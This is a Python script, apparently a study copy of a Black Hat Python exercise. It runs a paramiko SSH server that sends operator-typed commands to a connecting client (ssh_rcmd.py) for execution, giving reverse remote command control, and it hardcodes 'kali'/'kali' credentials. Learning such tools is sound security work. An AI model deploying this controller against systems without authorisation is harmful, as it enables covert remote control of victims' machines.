# server for the 𝘴𝘴𝘩_𝘳𝘤𝘮𝘥.𝘱𝘺 client
import os
import  paramiko
import socket
import sys
import threading

CWD = os.path.dirname(os.path.realpath(__file__))
HOSTKEY = paramiko.RSAKey(filename=os.path.join(CWD, 'test_rsa.key'))
# SSH key included in the paramiko demo files

class Server (paramiko.ServerInterface): # SSH-inization of socket
    def __init__(self):
        self.event = threading.Event()
    
    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
    
    def check_auth_password(self, username, password):
        if (username=='kali' and (password=='kali')): # Are we really hard coding this?
            return paramiko.AUTH_SUCCESSFUL

if __name__ == '__main__':
    server = '127.0.0.1'
    ssh_port = 2222
    
    try:
        sock =  socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((server, ssh_port))# Socket listener, the usual
        sock.listen(100)
        print('[+] Listening for connection...')
        client, addr = sock.accept()
    except Exception as e:
        print('[-] Listen failed:' + str(e))
    else:
        print('[+] Got a connection!', client, addr)
        
    bhSession = paramiko.Transport(client)# auth method configuration
    bhSession.add_server_key(HOSTKEY)
    ssh_server = Server()
    bhSession.start_server(server=ssh_server)
    
    chan = bhSession.accept(20)
    if chan is None:
        print('**** No Channel')
        sys.exit(1)
    
    print('[+] Authenticated')# When in
    print(chan.recv(1024))
    chan.send('Welcome to bh_ssh')
    try:
    # any command typed into the ssh server will be sent to and executed by the client 𝘴𝘴𝘩_𝘳𝘤𝘮𝘥.𝘱𝘺
        while True:
            command= input('Enter command: ')
            if command != 'exit':
                chan.send(command)
                r = chan.recv(8192) # try again with 1024 for clarity??
                print(r.decode())
            else:
                chan.send('exit')
                print('exiting')
                bhSession.close()
                break                
    except KeyboardInterrupt:
        bhSession.close()
        